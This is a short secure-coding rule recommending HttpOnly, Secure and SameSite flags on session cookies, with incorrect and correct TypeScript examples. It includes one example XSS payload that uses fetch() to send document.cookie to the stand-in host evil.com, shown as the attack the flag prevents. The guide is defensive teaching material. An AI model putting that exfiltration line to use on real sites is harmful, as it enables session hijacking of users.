---
title: Set HttpOnly On Session Cookies  
impact: MEDIUM
impactDescription: prevents cookie theft via XSS
tags: cookies, httponly, xss, session, security
---

## Set HttpOnly On Session Cookies

Without HttpOnly, JavaScript can read cookie values, enabling XSS attacks to steal sessions.

**Incorrect (no HttpOnly):**

```typescript
res.cookie('session', token);  // Accessible via document.cookie
```

**Correct (HttpOnly set):**

```typescript
res.cookie('session', token, {
  httpOnly: true,  // Not accessible to JavaScript
  secure: true,
  sameSite: 'strict'
});
```

**XSS attack example (prevented by HttpOnly):**

```javascript
// Attacker's XSS payload (blocked by HttpOnly)
fetch('https://evil.com/steal?cookie=' + document.cookie);
// With HttpOnly, session cookie is NOT in document.cookie
```

**Tools:** Browser DevTools, OWASP ZAP
